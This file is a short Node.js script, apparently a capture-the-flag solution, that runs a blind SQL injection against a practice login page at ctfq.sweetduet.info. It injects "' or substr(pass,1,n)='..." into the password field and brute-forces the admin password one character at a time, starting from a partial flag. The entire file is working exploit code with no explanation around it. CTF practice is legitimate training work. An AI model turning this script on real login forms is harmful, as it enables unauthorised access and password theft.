const fetch = require('isomorphic-fetch');
const FormData = require('form-data');

function f(fd) {
  return fetch(
    "http://ctfq.sweetduet.info:10080/~q6/",
    {method: "POST", body: fd}
  ).then((res) => res.text());
}

function createFD(pass) {
  let fd = new FormData();
  fd.append('id', 'admin');
  fd.append('pass', "' or substr(pass,1," + pass.length + ")='" + pass);
  return fd;
}

const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
// const chars = "0123456789abcdefghijklmnopqrstuvwxyz".split('');

function tryAns(ans) {
  return new Promise((resolve, reject) => {
    f(createFD(ans))
    .then((body) => {
      resolve(body.includes("php"));
    })
  });
}

function findNextChar(prefix) {
  return new Promise((resolve, reject) => {
    Promise.all(
      chars.map((c) =>
        tryAns(prefix + c)
        .then((success) => {
          if(!success) {
            console.log("NO: " + prefix + c);
            return
          }
          console.log("YES: " + prefix + c);
          resolve(prefix + c);
        })
      )
    ).then(() => {
      reject();
    });
  });
}

function solve(prefix) {
  return new Promise((resolve, reject) => {
    findNextChar(prefix)
    .then((ans) =>
      solve(ans)
    ).catch(() => {
      resolve(prefix);
    });
  });
}

solve('FLAG_KpWa4ji3uZk6T')
.then((ans) => {
  console.log("ans: " + ans);
});
